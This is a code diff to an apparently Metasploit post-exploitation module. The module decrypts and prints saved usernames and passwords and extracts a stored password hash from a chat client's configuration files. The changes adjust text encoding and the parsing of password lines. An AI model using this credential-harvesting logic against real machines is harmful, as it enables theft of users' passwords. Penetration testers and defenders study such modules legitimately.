@@ -52,7 +52,7 @@ class Metasploit3 < Msf::Post
 		password = cipher.update encrypted
 		password << cipher.final
 
-		password = password.encode('UTF-8')
+		password = ::Rex::Text.to_utf8(password)
 
 		credentials = password.split("\u0001")
 		print_good("Decrypted Username #{credentials[0]} Password: #{credentials[1]}")
@@ -91,7 +91,7 @@ class Metasploit3 < Msf::Post
 				contents = config.read
 
 				# look for lines containing string 'password'
-				password = contents.split("\n").grep(/password/)
+				password= contents.split("\n").grep(/password/)
 				if password.nil?
 					# file doesn't contain a password
 					print_status("#{file} does not contain any saved passwords")
@@ -101,7 +101,8 @@ class Metasploit3 < Msf::Post
 				end
 
 				# store the hash close the file
-				hash = password[1].split("password").join.chomp
+				password = password.delete_if {|e| e !~ /password.+=.+=\r/}
+				hash = password[0].split("password").join.chomp
 				print_status("Spark password hash: #{hash}") if datastore['VERBOSE']
 				config.close
 
